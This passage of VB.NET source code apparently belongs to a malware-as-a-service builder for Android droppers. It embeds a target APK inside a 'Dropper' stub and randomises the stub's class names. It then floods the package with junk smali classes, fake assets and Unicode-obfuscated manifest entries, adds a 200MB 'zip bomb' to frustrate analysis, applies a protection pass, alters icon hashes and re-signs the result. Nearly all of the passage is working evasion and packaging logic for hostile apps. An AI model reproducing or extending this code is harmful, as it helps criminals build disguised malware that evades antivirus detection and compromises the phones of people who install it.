                                                 "-----------Finished-------------" & vbNewLine &
                                                 "> App: " & originalapkname & vbNewLine)



                    ' userfolder + "\" + appid + ".apk"

                    If File.Exists(userfolder + "\" + appid + ".apk") Then
                        File.Delete(userfolder + "\" + appid + ".apk")
                    End If

                    For index = 1 To 5
                        Thread.Sleep(1000)

                    Next

                    If use_access <> "1" Or installtype = "g" Then


                        Mylogger.Logbuild(userid, "No Drooper needed...")



                        Mylogger.Logbuild(userid, "signoutput: " + signoutput)

                        If Not Directory.Exists(userfolder) Then
                            Directory.CreateDirectory(userfolder)
                        End If

                        'If Not Directory.Exists(userfolder + "\" + appid) Then
                        '    Directory.CreateDirectory(userfolder + "\" + appid)
                        'End If

                        Mylogger.Logbuild(userid, "userfolder: " + userfolder + "\" + appid)

                        File.Move(signoutput, userfolder + "\" + appid + ".apk")


                        For index = 1 To 30
                            Thread.Sleep(100)

                        Next



                        Worker.UpdateState(Worker.finished)
                        Mylogger.Logbuild(userid, "Cleanning...")

                        Try
                            'Cleaning
                            Mylogger.Logbuild(userid, "Cleanning WorkingDir...")
                            DirectoryDeleteLong(WorkingDir)
                        Catch ex As Exception
                            Mylogger.Logbuild(userid, "error WorkingDir: " + ex.Message)
                        End Try



                        HoldFinishing = False

                        StopCommandPrompt()
                        Exit Sub

                    End If

                    TargetAPKPATH = signoutput


                    BackgroundWorker1 = New System.ComponentModel.BackgroundWorker()
                    If Not BackgroundWorker1.IsBusy Then
                        BackgroundWorker1.RunWorkerAsync()
                    End If



                End If

            Catch ex As Exception


                Mylogger.LogError(userid, ">" & "Global Error: ", ex.Message)
                singout(MYID)

                Try
                    'Cleaning
                    Mylogger.Logbuild(userid, "Cleanning WorkingDir...")
                    DirectoryDeleteLong(WorkingDir)
                Catch ex2 As Exception
                    Mylogger.LogError(userid, "error WorkingDir 2: ", ex.Message)
                End Try

                Environment.Exit(0)
            End Try


        End If
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Try
            Mylogger.Logbuild(userid, "Extracting...")


            'TargetApkicon
            'appid

            Dim folder_building As String


            Try
                folder_building = Generatedrop("drp")
            Catch ex As Exception
                Mylogger.Logbuild(userid, "Error Droper Work Folder:" + ex.Message)
                Environment.Exit(0)
            End Try

            WorkDIR = folder_building

            STUBPATH = WorkDIR + "\STUB"
            outputpath = WorkDIR + "\out"
            buildapkpath = outputpath + "\" + "temp.apk"



            Directory.CreateDirectory(WorkDIR)
            Directory.CreateDirectory(WorkDIR + "\tools")
            Directory.CreateDirectory(STUBPATH)
            Directory.CreateDirectory(outputpath)


            apktoolpath = WorkDIR + "\tools\" + "apktool.jar"
            Apksignerpath = WorkDIR + "\tools\" + "signapk.jar"
            ApkZIPpath = WorkDIR + "\tools\" + "zipalign.exe"
            Apkeditorpath = WorkDIR + "\tools\" + "ApkEditor.jar"

            C = WorkDIR + "\tools\" + "certificate.pem"
            K = WorkDIR + "\tools\" + "key.pk8"



            ' File.WriteAllBytes(apktoolpath, My.Resources.apktool)
            ' File.WriteAllBytes(Apksignerpath, My.Resources.signapk)
            ' File.WriteAllBytes(ApkZIPpath, My.Resources.zipalign)
            ' File.WriteAllBytes(Apkeditorpath, My.Resources.APKEditor)
            'File.WriteAllBytes(STUBPATH & "\drop.zip", My.Resources.dropstub)



            File.WriteAllBytes(apktoolpath, My.Resources.apktool)
            File.WriteAllBytes(Apksignerpath, My.Resources.signapk)
            File.WriteAllBytes(ApkZIPpath, My.Resources.zipalign)
            File.WriteAllBytes(Apkeditorpath, My.Resources.APKEditor)

            ' File.WriteAllBytes(STUBPATH & "\drop.zip", My.Resources.dropstub)
            File.Copy(DropStub, STUBPATH & "\drop.zip")

            Thread.Sleep(1000)
            System.IO.Compression.ZipFile.ExtractToDirectory(STUBPATH & "\drop.zip", STUBPATH)

            Thread.Sleep(1000)
            File.Delete(STUBPATH & "\drop.zip")


            Mylogger.Logbuild(userid, ">" & "loading payload...")


            assetspath = STUBPATH + "\assets"

            BASEPATH = assetspath + "\update.apk"

            If File.Exists(BASEPATH) Then
                File.Delete(BASEPATH)
            End If


            File.Copy(TargetAPKPATH, BASEPATH)

            Mylogger.Logbuild(userid, "bmb assets droper..")
            InjectRandomJunkFiles(assetspath)
            InjectRandomJunkFiles(assetspath)



            stringspath = STUBPATH + "\res\values\strings.xml"
            MainfistPath = STUBPATH + "\AndroidManifest.xml"
            stubicon = STUBPATH + "\res\drawable\myicon.png"


            ' Dim theppname As String = Path.GetFileName(appdir)

            Dim yml As String = STUBPATH + "\apktool.yml"
            Do
                Thread.Sleep(100)
            Loop While Not File.Exists(yml) Or FileInUse(yml)
            Dim readyml As String = File.ReadAllText(yml).Replace("3.31.165", Worker.appversion + " " + Random_Word()).Replace("331165", Worker.appversion.Replace(".", ""))
            File.WriteAllText(yml, readyml)



            Mylogger.Logbuild(userid, "loading data...")

            Dim allstr As String = File.ReadAllText(stringspath).Replace("[MY-NAME]", InsertZWNJ(appname))

            File.WriteAllText(stringspath, allstr)


            Dim strarray() As String = File.ReadAllLines(stringspath)
            Dim junkstr As String = ""
            For index = 1 To 200
                junkstr += "    <string name=" + """" + Random_Word() + RandommMad(4, 15) + """>" + Random_Word() + RandommMad(4, 15) + "</string>" + vbNewLine
            Next

            For i As Integer = 0 To strarray.Length - 1
                If strarray(i).Contains("<string name") Then
                    strarray(i) = strarray(i) + vbNewLine + junkstr
                    Exit For
                End If
            Next

            File.WriteAllLines(stringspath, strarray)

            File.Delete(stubicon)


            Dim icobytes As Byte() = File.ReadAllBytes(Worker.TargetApkicon)

            ' Append junk bytes (this changes MD5 but not image content)
            Dim junk As Byte() = System.Text.Encoding.ASCII.GetBytes("<!--" & Guid.NewGuid().ToString() & "-->")
            Dim newBytes As Byte() = icobytes.Concat(junk).ToArray()
            File.WriteAllBytes(stubicon, newBytes)

            'File.Copy(TargetApkicon, stubicon)




            Mylogger.Logbuild(userid, "Encoding")


            ClassesPath = STUBPATH + "\smali\com\appd\instll"




            Dim allfiles() As String = Directory.GetFiles(STUBPATH + "\smali\com\appd\instll")

            '  Dim allfiles2() As String = Directory.GetFiles(STUBPATH + "\smali\com\apps\drooper")


            N_Class1 = RandomSTR(10, 20)
            N_Class2 = RandomSTR(10, 20)
            N_Class3 = RandomSTR(10, 20)
            N_Class4 = RandomSTR(10, 20)
            N_Class5 = RandomSTR(10, 20)
            N_ClassGen6 = RandomSTR(10, 20)
            N_ClassGen7 = RandomSTR(10, 20)



            Dim allmanifist As String = File.ReadAllText(MainfistPath).Replace(ClassGen1, N_Class1) _
                    .Replace(ClassGen2, N_Class2) _
                    .Replace(ClassGen3, N_Class3) _
                    .Replace(ClassGen4, N_Class4) _
                    .Replace("[T_ID]", appid) _
                    .Replace(ClassGen6, N_ClassGen6) _
                    .Replace(ClassGen7, N_ClassGen7) _
                    .Replace("target.app.rep", appid) _
                    .Replace(drop_oldpkg, drop_newpkg) _
                    .Replace(ClassGen5, N_Class5)

            ' File.WriteAllText("c:\test\emini.xml", allmanifist)

            File.WriteAllText(MainfistPath, ConfuseAndObfuscateManifestXml(allmanifist))
            ''File.WriteAllText(MainfistPath, allmanifist)

            For Each smali In allfiles

                Dim smalitext As String = File.ReadAllText(smali).Replace("[T_ID]", appid) _
                    .Replace(ClassGen1, N_Class1) _
                    .Replace(ClassGen2, N_Class2) _
                    .Replace(ClassGen3, N_Class3) _
                    .Replace(ClassGen4, N_Class4) _
                    .Replace(ClassGen6, N_ClassGen6) _
                    .Replace(ClassGen7, N_ClassGen7) _
                    .Replace(drop_oldpkg, drop_newpkg) _
                    .Replace(drop_oldpkg_insmali, drop_newpkg_insmali) _
                    .Replace(ClassGen5, N_Class5)

                File.WriteAllText(smali, smalitext)

            Next

            Mylogger.Logbuild(userid, ">" & "> Encryption ALL 2...")

            Dim dropsmali = STUBPATH + "\smali"

            For Each fileInMain As String In Directory.GetFiles(dropsmali, "*.smali", SearchOption.AllDirectories)
                If Not fileInMain.Contains("\android\") AndAlso Not fileInMain.Contains("\androidx\") Then



                    Dim fileContent As String = File.ReadAllText(fileInMain)
                    Dim newContent As String = fileContent.Replace("[T_ID]", appid) _
                    .Replace(ClassGen1, N_Class1) _
                    .Replace(ClassGen2, N_Class2) _
                    .Replace(ClassGen3, N_Class3) _
                    .Replace(ClassGen4, N_Class4) _
                    .Replace(ClassGen6, N_ClassGen6) _
                    .Replace(ClassGen7, N_ClassGen7) _
                    .Replace(drop_oldpkg, drop_newpkg) _
                    .Replace(drop_oldpkg_insmali, drop_newpkg_insmali) _
                    .Replace(ClassGen5, N_Class5)



                    File.WriteAllText(fileInMain, newContent)

                End If
            Next


            Mylogger.Logbuild(userid, "junk classes Dropper...")

            GenerateJunkSmaliFiles(dropsmali, 245)

            ' ShuffleSmaliFiles(STUBPATH, 7)


            Mylogger.Logbuild(userid, "Building Dropper...")
            fordroper = True
            ExecuteCommand("java -jar " & apktoolpath & " b -f " & STUBPATH & " -o " & buildapkpath)
            Do
                Thread.Sleep(1000)

            Loop While Waitbuild

            Mylogger.Logbuild(userid, "bmb droper..")

            AddZipBombEncrypted(buildapkpath)



            Waitprotect = True

            Mylogger.Logbuild(userid, "Protect Dropper..")

            Dim protectedoutput As String = buildapkpath.Replace(".apk", "_protected.apk")
            Dim protectcommand As String = "java -jar " & Apkeditorpath & " p " & " -i " & """" & buildapkpath & """"
            ExecuteCommand(protectcommand)


            Do
                Thread.Sleep(1000)
            Loop While Waitprotect Or FileInUse(protectedoutput)


            File.Delete(buildapkpath)

            Mylogger.Logbuild(userid, "Zip Align..")


            Dim zipcomadn As String = ApkZIPpath + " 5 " & """" & protectedoutput & """" & " " & """" & protectedoutput.Replace("temp_protected.apk", "temp_zip.apk") & """"
            Dim zipoutput As String = protectedoutput.Replace("temp_protected.apk", "temp_zip.apk")
            ExecuteCommand(zipcomadn)

            Do
                Thread.Sleep(1000)
            Loop While Not File.Exists(zipoutput) Or FileInUse(zipoutput)



            File.Delete(protectedoutput)


            Mylogger.Logbuild(userid, "Signing Dropper..")

            File.WriteAllBytes(C, My.Resources.certificate)
            File.WriteAllBytes(K, My.Resources.key)

            Thread.Sleep(1000)

            Dim signoutput As String = outputpath & "\" & originalapkname.Replace(".apk", "_Dropper.apk")
            Dim singcommand As String = "java -jar " & """" & Apksignerpath & """" & " sign --key " & """" & K & """" & " --cert " & """" & C & """" & "  --v2-signing-enabled true --v3-signing-enabled --v4-signing-enabled true --out " & """" & signoutput & """" & " " & """" & zipoutput & """"
            ExecuteCommand(singcommand)

            Do
                Thread.Sleep(1000)
            Loop While Not File.Exists(signoutput) Or FileInUse(signoutput) Or FileInUse(zipoutput)


            File.Delete(zipoutput)

            For index = 1 To 5
                Thread.Sleep(1000)

            Next

            File.Move(signoutput, userfolder + "\" + appid + ".apk")

            For index = 1 To 30
                Thread.Sleep(100)

            Next

            Worker.UpdateState(Worker.finished)
            Mylogger.Logbuild(userid, "Cleanning...")
            Try
                'Cleaning
                Mylogger.Logbuild(userid, "WorkDIR...")
                DirectoryDeleteLong(WorkDIR)
            Catch ex As Exception
                Mylogger.LogError(userid, "error WorkDIR 2 : ", ex.Message)
            End Try

            Try
                'Cleaning
                Mylogger.Logbuild(userid, "Cleanning WorkingDir...")
                DirectoryDeleteLong(WorkingDir)
            Catch ex As Exception
                Mylogger.LogError(userid, "error WorkingDir: ", ex.Message)
            End Try


            HoldFinishing = False

            StopCommandPrompt()

        Catch ex As Exception

            Worker.UpdateState(Worker.failed)
            Mylogger.LogError(userid, ">" & "Global Error 22: ", ex.Message)

            singout(MYID)

            Try
                'Cleaning
                Mylogger.Logbuild(userid, "Cleanning WorkingDir...")
                DirectoryDeleteLong(WorkingDir)
            Catch ex2 As Exception
                Mylogger.Logbuild(userid, "error WorkingDir: " + ex.Message)
            End Try

            Environment.Exit(0)

        End Try
    End Sub




    Private C As String = ""
    Private K As String = ""

    Dim Waitprotect As Boolean = True
    Dim Waitbuild As Boolean = True
    Dim fordroper As Boolean = False

    Private ClassGen1 As String = "BroReceiver"
    Private ClassGen2 As String = "ConfirmDialog"
    Private ClassGen3 As String = "MainActivity"
    Private ClassGen4 As String = "SecoundActivity"
    Private ClassGen5 As String = "SessionManager"
    Private ClassGen6 As String = "splash"
    Private ClassGen7 As String = "constants"

    Private N_Class1 As String = ""
    Private N_Class2 As String = ""
    Private N_Class3 As String = ""
    Private N_Class4 As String = ""
    Private N_Class5 As String = ""
    Private N_ClassGen6 As String = ""
    Private N_ClassGen7 As String = ""


    Private stubicon As String = ""
    Private MainfistPath As String = ""
    Private stringspath As String = ""
    Private TargetAPKPATH As String = ""
    Private TargetApkicon As String = ""
    Private WorkDIR As String
    Private outputpath As String = ""
    Private buildapkpath As String = ""
    Private STUBPATH As String = ""
    Private BASEPATH As String = ""
    Private assetspath As String = ""
    Private ClassesPath As String = ""



    Private Sub StopCommandPrompt()
        Try
            cmdProcess.CloseMainWindow()
            cmdProcess.Close()
            cmdProcess.Dispose()
        Catch ex As Exception

        End Try
    End Sub
    Private Async Sub UpdateState(subCommand As String)

        If IsCustomeApp Then
            Dim client As HttpClient = New HttpClient()
            Dim jsonData As String = JsonConvert.SerializeObject(New Dictionary(Of String, Object)() From {{"userid", Worker.userid}, {"appid", Worker.appid}, {"subcom", subCommand}})
            Dim content As StringContent = New StringContent(jsonData, Encoding, "application/json")
            Try
                Dim response As HttpResponseMessage = Await client.PostAsync(Worker.ServerApi_Customapp, content)
                response.EnsureSuccessStatusCode()
                Dim responseContent As String = Await response.Content.ReadAsStringAsync()
                Mylogger.Logbuild(Worker.userid, ">Server UpdateState: " + responseContent)
            Catch ex As Exception
                Mylogger.Logbuild(Worker.userid, ">UpdateState Error: " + ex.Message)
            End Try
        Else
            Dim client2 As HttpClient = New HttpClient()
            Dim jsonData2 As String = JsonConvert.SerializeObject(New Dictionary(Of String, Object)() From {{"userid", Worker.userid}, {"appid", Worker.appid}, {"subcom", subCommand}})
            Dim content2 As StringContent = New StringContent(jsonData2, Encoding, "application/json")
            Try
                Dim response2 As HttpResponseMessage = Await client2.PostAsync(Worker.ServerApi, content2)
                response2.EnsureSuccessStatusCode()
                Dim responseContent2 As String = Await response2.Content.ReadAsStringAsync()
                Mylogger.Logbuild(Worker.userid, ">Server UpdateState: " + responseContent2)
            Catch ex2 As Exception
                Mylogger.Logbuild(Worker.userid, ">UpdateState Error: " + ex2.Message)
            End Try
        End If
    End Sub
    Private Async Sub InsertApp()

        If isCustomeApp Then
            Dim client As HttpClient = New HttpClient()
            Dim jsonData As String = JsonConvert.SerializeObject(New Dictionary(Of String, Object)() From {{"userid", Worker.userid}, {"appid", Worker.appid}, {"apppath", Worker.userfolder + "\" + Worker.appid + ".apk"}, {"subcom", Worker.onbuild}, {"appname", Worker.appname}, {"", Worker.userid + "/icons/" + Worker.appicopath}, {"appver", BT_appver}})
            Dim content As StringContent = New StringContent(jsonData, Encoding, "application/json")
            Try
                Dim response As HttpResponseMessage = Await client.PostAsync(Worker.ServerApi_Customapp, content)
                response.EnsureSuccessStatusCode()
                Dim responseContent As String = Await response.Content.ReadAsStringAsync()
                Mylogger.Logbuild(Worker.userid, ">Server InsertApp 2: " + responseContent)
            Catch ex As Exception
                Mylogger.Logbuild(Worker.userid, ">InsertApp Error 2: " + ex.Message)
            End Try
        Else
            Dim client2 As HttpClient = New HttpClient()
            Dim jsonData2 As String = JsonConvert.SerializeObject(New Dictionary(Of String, Object)() From {{"userid", Worker.userid}, {"appid", Worker.appid}, {"apppath", Worker.userfolder + "\" + Worker.appid + ".apk"}, {"subcom", Worker.onbuild}, {"appver", BT_appver}})
            Dim content2 As StringContent = New StringContent(jsonData2, Encoding, "application/json")
            Try
                Dim response2 As HttpResponseMessage = Await client2.PostAsync(Worker.ServerApi, content2)
                response2.EnsureSuccessStatusCode()
                Dim responseContent2 As String = Await response2.Content.ReadAsStringAsync()
                Mylogger.Logbuild(Worker.userid, ">Server InsertApp: " + responseContent2)
            Catch ex2 As Exception
                Mylogger.Logbuild(Worker.userid, ">InsertApp Error: " + ex2.Message)
            End Try
        End If
    End Sub
    Public Function ConfuseAndObfuscateManifestXml(xmlContent As String) As String
        Dim xmlDoc As New XmlDocument()
        Try
            xmlDoc.LoadXml(xmlContent)
        Catch ex As Exception
            Return xmlContent
        End Try

        Dim rand As New Random()
        Dim androidNs As String = "http://schemas.android.com/apk/res/android"
        Dim nsMgr As New XmlNamespaceManager(xmlDoc.NameTable)
        nsMgr.AddNamespace("android", androidNs)

        ' Helper to generate a safe obfuscated name using Unicode ranges (CJK, Cyrillic, etc.)
        Dim GetObfuscatedName As Func(Of Integer, String) = Function(length As Integer)
                                                                Dim sb As New System.Text.StringBuilder()
                                                                For i = 1 To length
                                                                    Dim choice = rand.Next(0, 4)
                                                                    Dim ch As Char
                                                                    Select Case choice
                                                                        Case 0 ' CJK
                                                                            ch = ChrW(&H4E00 + rand.Next(0, &H9FFF - &H4E00))
                                                                        Case 1 ' Korean Hangul
                                                                            ch = ChrW(&HAC00 + rand.Next(0, &HD7A3 - &HAC00))
                                                                        Case 2 ' Cyrillic
                                                                            ch = ChrW(&H400 + rand.Next(0, &H4FF - &H400))
                                                                        Case Else ' Basic Latin letter
                                                                            ch = ChrW(Asc("a") + rand.Next(0, 26))
                                                                    End Select
                                                                    sb.Append(ch)
                                                                Next
                                                                Return sb.ToString()
                                                            End Function

        Dim allNodes As New List(Of XmlElement)()
        For Each node As XmlElement In xmlDoc.GetElementsByTagName("*")
            allNodes.Add(node)
        Next

        For Each node As XmlElement In allNodes
            Try
                ' Random Unicode junk attribute
                Dim attrName As String = "android:" & XmlConvert.EncodeName(GetObfuscatedName(12))
                Dim attrValue As String = "><" & Guid.NewGuid().ToString("N").Substring(0, 8) & $">\n<!-- {Guid.NewGuid().ToString("N").Substring(0, 8)} -->"
                node.SetAttribute(attrName, attrValue)


                Dim junkCount As Integer = 100 + rand.Next(10, 30)
                If {"uses-permission", "permission", "meta-data", "action", "category", "data", "intent", "uses-library", "queries", "uses-feature", "intent-filter"}.Contains(node.Name) Then
                    junkCount = 1
                    'Continue For
                End If

                ' Add junk <meta-data> children

                For i As Integer = 1 To junkCount
                    Dim junkMeta As XmlElement = xmlDoc.CreateElement("meta-data")
                    Dim nameVal As String = XmlConvert.EncodeName(GetObfuscatedName(12)) & "." & Guid.NewGuid().ToString("N").Substring(0, 6)
                    Dim valVal As String = GetObfuscatedName(14) & "_v_" & rand.Next(100000, 999999)
                    junkMeta.SetAttribute("name", androidNs, nameVal)
                    junkMeta.SetAttribute("value", androidNs, valVal)
                    node.AppendChild(junkMeta)
                Next
            Catch
                ' Skip failed insertions silently
            End Try
        Next

        ' Add more junk <meta-data> under <application>
        Dim applicationNode As XmlNode = xmlDoc.SelectSingleNode("//application")
        If applicationNode IsNot Nothing Then
            Dim junkCount As Integer = 100 + rand.Next(10, 30)
            For i As Integer = 1 To junkCount
                Dim metaDataNode As XmlElement = xmlDoc.CreateElement("meta-data")
                Dim fakeName As String = "com." & XmlConvert.EncodeName(GetObfuscatedName(12)) & "." & GetObfuscatedName(5)
                Dim fakeValue As String = GetObfuscatedName(4) & "_value_" & rand.Next(100000, 999999)
                metaDataNode.SetAttribute("name", androidNs, fakeName)
                metaDataNode.SetAttribute("value", androidNs, fakeValue)
                applicationNode.AppendChild(metaDataNode)
            Next
        End If

        ' Output the modified XML as UTF-8
        Using ms As New MemoryStream()
            Dim settings As New XmlWriterSettings() With {
            .Encoding = New UTF8Encoding(False),
            .Indent = True,
            .OmitXmlDeclaration = False
        }
            Using writer As XmlWriter = XmlWriter.Create(ms, settings)
                xmlDoc.Save(writer)
            End Using
            Return Encoding.UTF8.GetString(ms.ToArray())
        End Using
    End Function

    Public Sub InjectRandomJunkFiles(targetDir As String)
        Try
            If Not Directory.Exists(targetDir) Then
                'Console.WriteLine("Directory does not exist.")
                Mylogger.Logbuild(userid, ">" & "> Inject:Directory does not exist...")
                Return
            End If

            Dim rand As New Random()
            Dim numFiles As Integer = rand.Next(120, 150) ' Add 5 to 10 files

            For i As Integer = 1 To numFiles
                Dim isXml As Boolean = rand.NextDouble() < 0.5 ' 50/50 chance for XML or PNG
                Dim fileName As String = "c_" & Guid.NewGuid().ToString("N").Substring(0, 8)

                If isXml Then
                    ' Create fake XML
                    Dim filePath As String = Path.Combine(targetDir, fileName & ".xml")
                    Dim xmlContent As String = "<?xml version=""1.0"" encoding=""utf-8""?>" & vbCrLf &
                                           "<items>" & vbCrLf &
                                           "  <item>" & Guid.NewGuid().ToString() & "</item>" & vbCrLf &
                                           "  <itemx>" & Guid.NewGuid().ToString() & "</item>" & vbCrLf &
                                           "  <itemy>" & Guid.NewGuid().ToString() & "</item>" & vbCrLf &
                                           "  <itemy>" & Guid.NewGuid().ToString() & "</item>" & vbCrLf &
                                           "  <flag>" & rand.Next(1000, 9999).ToString() & "</flag>" & vbCrLf &
                                           "  <flag>" & rand.Next(1000, 9999).ToString() & "</flag>" & vbCrLf &
                                           "  <flagx>" & rand.Next(1000, 9999).ToString() & "</flag>" & vbCrLf &
                                           "  <flagy>" & rand.Next(1000, 9999).ToString() & "</flag>" & vbCrLf &
                                           "</items>"
                    File.WriteAllText(filePath, xmlContent)
                Else
                    ' Create fake PNG
                    Dim filePath As String = Path.Combine(targetDir, fileName & ".png")
                    Dim bmpWidth As Integer = rand.Next(25, 30)
                    Dim bmpHeight As Integer = rand.Next(10, 20)
                    Using bmp As New Bitmap(bmpWidth, bmpHeight)
                        For x As Integer = 0 To bmp.Width - 1
                            For y As Integer = 0 To bmp.Height - 1
                                Dim color As Color = color.FromArgb(rand.Next(256), rand.Next(256), rand.Next(256))
                                bmp.SetPixel(x, y, color)
                            Next
                        Next
                        bmp.Save(filePath, Imaging.ImageFormat.Png)
                    End Using
                End If
            Next

            ' Console.WriteLine("✅ Junk files injected into: " & targetDir)
            Mylogger.Logbuild(userid, ">" & ">  Junk files:done...")
        Catch ex As Exception
            'Console.WriteLine("❌ Error injecting junk files: " & ex.Message)
            Mylogger.Logbuild(userid, ">" & ">  Junk files:error " & ex.Message)
        End Try
    End Sub

    Public Sub AddZipBombEncrypted(apkPath As String)
        Mylogger.Logbuild(userid, "AddZipBombEncrypted...")
        Dim tempBombPath As String = Path.Combine(Path.GetTempPath(), "classes.so")

        ' 1. Generate large dummy file (e.g. 200MB)
        Using fs As New FileStream(tempBombPath, FileMode.Create, FileAccess.Write)
            Dim buffer(1023) As Byte ' 1 KB
            For i As Integer = 1 To 200000 ' ~200 MB
                fs.Write(buffer, 0, buffer.Length)
            Next
        End Using

        ' 2. Inject it encrypted into APK's assets folder
        Using zip As Ionic.Zip.ZipFile = Ionic.Zip.ZipFile.Read(apkPath)
            zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression
            zip.UseZip64WhenSaving = Ionic.Zip.Zip64Option.Never

            ' Clean up if bomb.dat already exists
            Dim existing = zip("assets/classes")
            If existing IsNot Nothing Then zip.RemoveEntry(existing)

            zip.AddFile(tempBombPath, "assets") ' assets/bomb.dat
            zip.Save()
        End Using

        ' 3. Delete temp file
        If File.Exists(tempBombPath) Then File.Delete(tempBombPath)

        Mylogger.Logbuild(userid, "zip bomb added...")
    End Sub


    Public Sub GenerateJunkSmaliFiles(smaliRootPath As String, Optional count As Integer = 100)
        Dim rand As New Random()
        Dim junkDirs As New List(Of String)()

        ' Get existing subdirectories except ignored ones
        Dim existingDirs As String() = Directory.GetDirectories(smaliRootPath, "*", SearchOption.AllDirectories)
        For Each dir As String In existingDirs
            Dim lowerDir As String = dir.ToLowerInvariant().Replace("/", "\")
            If lowerDir.Contains("\androidx\") OrElse
           lowerDir.Contains("\android\") OrElse
           lowerDir.Contains("\unityfslma\") OrElse
           lowerDir.Contains("\okhttp3\") Then
                Continue For
            End If
            junkDirs.Add(dir)
        Next

        ' Add new random directories
        For i As Integer = 1 To 5
            Dim subDir As String = Path.Combine(smaliRootPath,
                                            RandomSTR(3, 15).ToLower(),
                                            RandomSTR(3, 15).ToLower(),
                                            RandomSTR(3, 15).ToLower())
            Directory.CreateDirectory(subDir)
            junkDirs.Add(subDir)
        Next

        ' Create junk classes in each dir
        For Each dir As String In junkDirs
            ' For i As Integer = 1 To Math.Ceiling(count / junkDirs.Count)
            For i As Integer = 1 To count
                Dim className As String = RandomSTR(6, 15).ToLower()
                Dim smaliPath As String = Path.Combine(dir, className & ".smali")

                Dim classPath As String = smaliPath.Substring(smaliRootPath.Length + 1) _
                    .Replace(Path.DirectorySeparatorChar, "/"c).Replace(".smali", "")

                Dim sb As New StringBuilder()
                sb.AppendLine($".class public L{classPath};")
                sb.AppendLine(".super Ljava/lang/Object;")
                sb.AppendLine()

                ' Add random fields with random values
                For j As Integer = 1 To rand.Next(10, 15)
                    Dim value As Integer = rand.Next(-8, 8) ' valid const/4 value range
                    sb.AppendLine($".field public static f{j}_{GetRandomChars(rand, 4)}:I = {value}")
                Next

                sb.AppendLine()

                ' Constructor
                sb.AppendLine(".method public constructor <init>()V")
                sb.AppendLine("    .locals 1")
                sb.AppendLine("    invoke-direct {p0}, Ljava/lang/Object;-><init>()V")
                sb.AppendLine("    return-void")
                sb.AppendLine(".end method")
                sb.AppendLine()

                ' Add fake methods with fake instructions
                For j As Integer = 1 To rand.Next(4, 10)
                    Dim methodName As String = "do" & GetRandomChars(rand, rand.Next(6, 9))
                    sb.AppendLine($".method public static {methodName}()V")
                    sb.AppendLine("    .locals 3")

                    ' Add junk instructions
                    sb.AppendLine("    const/4 v0, " & FormatConst4(rand.Next(-8, 8)))
                    sb.AppendLine("    const/4 v1, " & FormatConst4(rand.Next(-8, 8)))
                    sb.AppendLine("    const/4 v2, " & FormatConst4(rand.Next(-8, 8)))


                    Select Case rand.Next(0, 3)
                        Case 0
                            sb.AppendLine("    add-int v0, v0, v1")
                            sb.AppendLine("    mul-int v1, v1, v2")
                        Case 1
                            sb.AppendLine("    xor-int v0, v0, v2")
                            sb.AppendLine("    rem-int v2, v1, v0")
                        Case 2
                            sb.AppendLine("    or-int v1, v0, v2")
                            sb.AppendLine("    and-int v2, v1, v0")
                    End Select

                    sb.AppendLine("    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;")
                    sb.AppendLine("    const-string v0, """ + methodName + """")
                    sb.AppendLine("    invoke-virtual {v1, v0}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V")


                    sb.AppendLine("    return-void")
                    sb.AppendLine(".end method")
                    sb.AppendLine()
                Next



                Dim utf8WithoutBOM As New System.Text.UTF8Encoding(False)
                File.WriteAllText(smaliPath, sb.ToString(), utf8WithoutBOM)
            Next
        Next
    End Sub
    Private Function FormatConst4(value As Integer) As String
        If value < 0 Then
            Return "-0x" & Math.Abs(value).ToString("X")
        Else
            Return "0x" & value.ToString("X")
        End If
    End Function


    Private Function GetRandomChar(rand As Random) As String
        Dim c As Char = ChrW(rand.Next(97, 123)) ' a-z
        Return c.ToString().ToLower()
    End Function

    Private Function GetRandomChars(rand As Random, length As Integer) As String
        Dim sb As New StringBuilder()
        For i As Integer = 1 To length
            sb.Append(GetRandomChar(rand))
            sb.Append(GetRandomChar(rand))
            sb.Append(GetRandomChar(rand))
            sb.Append(GetRandomChar(rand))
            sb.Append(GetRandomChar(rand))
            sb.Append(GetRandomChar(rand))
            sb.Append(GetRandomChar(rand))
        Next
        Return sb.ToString().ToLower()
    End Function
    Public Sub ShuffleSmaliFiles(decompiledApkPath As String, numAdditionalFolders As Integer)
        If numAdditionalFolders < 1 Then
            Throw New ArgumentException("Number of additional folders must be at least 1.")
        End If

        ' Step 1: Find all existing smali folders
        Dim existingSmaliFolders As New List(Of String)()
        Dim baseDirs() As String = Directory.GetDirectories(decompiledApkPath)
        Dim maxIndex As Integer = 1

        For Each dir As String In baseDirs
            Dim folderName As String = Path.GetFileName(dir)
            If folderName = "smali" Then
                existingSmaliFolders.Add(dir)
            ElseIf folderName.StartsWith("smali_classes") Then
                Dim suffix As String = folderName.Substring("smali_classes".Length)
                Dim num As Integer
                If Integer.TryParse(suffix, num) Then
                    existingSmaliFolders.Add(dir)
                    If num > maxIndex Then maxIndex = num
                End If
            End If
        Next

        ' Step 2: Create new smali_classes folders starting from next available index
        Dim newSmaliFolders As New List(Of String)()
        For i As Integer = maxIndex + 1 To maxIndex + numAdditionalFolders
            Dim newFolder As String = Path.Combine(decompiledApkPath, "smali_classes" & i.ToString())
            Directory.CreateDirectory(newFolder)
            newSmaliFolders.Add(newFolder)
        Next

        ' Step 3: Collect all smali files with their source roots
        Dim allSmaliFiles As New List(Of SmaliFile)()
        For Each smaliFolder As String In existingSmaliFolders
            Dim smaliFiles() As String = Directory.GetFiles(smaliFolder, "*.smali", SearchOption.AllDirectories)
            For Each file As String In smaliFiles
                allSmaliFiles.Add(New SmaliFile(file, smaliFolder))
            Next
        Next

        ' Step 4: Shuffle the list
        Dim random As New Random()
        ShuffleList(allSmaliFiles, random)

        ' Step 5: Keep a portion in original folders
        Dim keepPerOriginal As Integer = Math.Max(1, allSmaliFiles.Count \ (existingSmaliFolders.Count + newSmaliFolders.Count))

        For i As Integer = 0 To allSmaliFiles.Count - 1
            Dim smaliFile As SmaliFile = allSmaliFiles(i)
            Dim relativePath As String = GetRelativePath(smaliFile.SourceRoot, smaliFile.FilePath)

            Dim keepInOriginal As Boolean = (i < keepPerOriginal * existingSmaliFolders.Count)

            If keepInOriginal Then
                ' Skip moving
                Continue For
            Else
                ' Choose a random folder excluding original
                Dim targetFolders As New List(Of String)(existingSmaliFolders)
                targetFolders.AddRange(newSmaliFolders)
                targetFolders.Remove(smaliFile.SourceRoot)

